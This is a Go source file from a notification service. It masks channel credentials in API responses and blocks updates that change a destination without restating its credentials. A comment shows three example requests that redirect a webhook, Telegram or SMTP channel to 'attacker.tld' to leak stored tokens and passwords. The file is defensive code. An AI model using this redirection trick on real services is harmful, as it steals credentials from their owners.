package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of masked values. When the API echoes credentials it replaces the real content with a value carrying this prefix,
// and the update endpoint interprets a value with this prefix as "keep the stored value unchanged".
//
// A prefix is used rather than an empty string or a fixed constant so that a little identifying information can ride along
// (see MaskedValue), letting users tell "which robot this is" without pasting the secret again.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              original value too short, no hint given
//	"__masked__:…ab12cd"      the last 6 characters of the original as an identifying hint
//
// Exposing only the last 6 characters is deliberate: a webhook URL's identifying information is in its last segment (e.g. the WeCom key,
// the Feishu robot id), while the prefix is identical across robots and has no identifying value. The last 6 characters are not enough
// to recover the credential, but enough for whoever configured it to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unchanged since the API echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config: better to have the UI show "config unavailable"
// than to hand back raw content that may contain credentials when the channel type is not recognized.
// Non-credential fields are kept as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential as a whole: deciding per sub-key would require every channel
		// to declare yet another set of "which sub-keys are credentials" rules, far more complexity than it is worth.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed, but the caller did not
// restate the credential fields". It is returned instead of silently allowing or silently dropping the credentials; see PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly restated
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "the destination (" + strings.Join(e.Changed, ", ") + ") has changed; re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + ") as well: provide new values, or explicitly leave them empty if no credentials are needed. " +
		"The existing credentials are only valid for the old destination; keeping them would hand them to the new one."
}

// PrepareConfigUpdate merges a channel config and handles the security-sensitive case of a "destination change".
//
// It replaces bare MergeConfig on the channel update path and closes the following path, verified to work in practice:
// the destination (where messages go) and the credentials (what identity sends them) are separate fields, and MergeConfig
// keeps the stored value for every "key not mentioned". So anyone who can PATCH a channel, by **changing only the address
// and staying silent about the credentials**, could make the server send the real stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent and does not depend on redirects (so rejecting cross-host redirects does not stop it),
// and it directly defeats the purpose of this package's masking: "credentials are never echoed to the browser".
//
// Rule: as soon as any destination key is changed to a new value, the caller must explicitly restate **every** credential key:
//   - a new value is given → use the new value
//   - an empty string is passed explicitly → the field no longer needs a credential (keeps the clearing semantics)
//   - the masked value is echoed back unchanged / the key is not mentioned at all → reject
//
// The third case is rejected too because a "masked value" means exactly "reuse the old credential", and the old credential
// is only valid for the old address. "Automatically drop the credential" is deliberately not done here: for optional credential fields
// (webhook headers, email password) it would silently turn into "auth is gone but the endpoint returns 200",
// which is harder to troubleshoot than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook headers is an object) has a masked literal embedded in it,
	// the caller has stuffed the "keep original value" sentinel inside a structure. MergeConfig only treats "a string
	// with the prefix" as masked, so this shape would be stored as an ordinary object: the literal "__masked__" would really
	// land in the database, and later auth would fail silently with no error at all. Better to reject it.
	//
	// This check must come **first**: when the address is unchanged there is an early return, so placing it later would
	// only cover the "address changed" path (the first version placed it wrong exactly like that, and the tests caught it).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were really changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: do an ordinary merge (masked values keep the original, empty strings clear, the rest overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require every credential key to be restated explicitly.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the mask sentinel inside a non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object field like webhook headers
// can only be masked as a whole (written as the string "__masked__") or submitted as a whole; putting the sentinel inside the object
// cannot express "keep unchanged" and would be stored in the database as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q; leave the whole field empty to keep the existing value or submit a complete new value, but do not embed mask placeholders inside it",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. Comparing via JSON serialization also handles
// type differences: the frontend submits the port as a number while the stored value reads back as float64, so a direct == would misjudge.
//
// "Empty" must be normalized before comparing: an empty string and "key absent" are the same state in this config model,
// because MergeConfig treats an empty string as an explicit clear and deletes the key. Without normalization, an
// optional destination field that is always left empty (Telegram's base_url is the only such field: empty means
// the official endpoint) would go down this path:
//
//	base_url:"" stored on create  →  the key is deleted by MergeConfig on the first save
//	→ on the second save incoming is "" and stored lacks the key, judged as "address changed"
//	→ the credential is a masked value → 400 "the destination has changed; re-enter the credential fields"
//
// From then on every save fails unless the user pastes the bot token again, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "empty".
// The rule must match MergeConfig's clearing check (strings.TrimSpace(s) == ""),
// otherwise there would be a gap where "MergeConfig thinks it should be deleted but sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating a channel config.
//
// Rules:
//   - keys in incoming whose value is masked → keep stored's original value (the user did not change this field)
//   - keys in incoming whose value is an empty string → treated as an explicit clear, the key is deleted
//   - other keys → overwritten with incoming's value
//   - keys in stored but not in incoming → kept (partial update semantics)
//
// Whether an empty string means "clear" has to be explicit: frontend forms submit unfilled fields as empty strings,
// and writing that as a valid value would really clear fields meant to be "left empty to keep the original".
// Explicit clearing is chosen here because when a wrongly set field needs to be cleared, the user has no other way to express it
// (dropping the field could distinguish "not provided" from "provided empty", but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
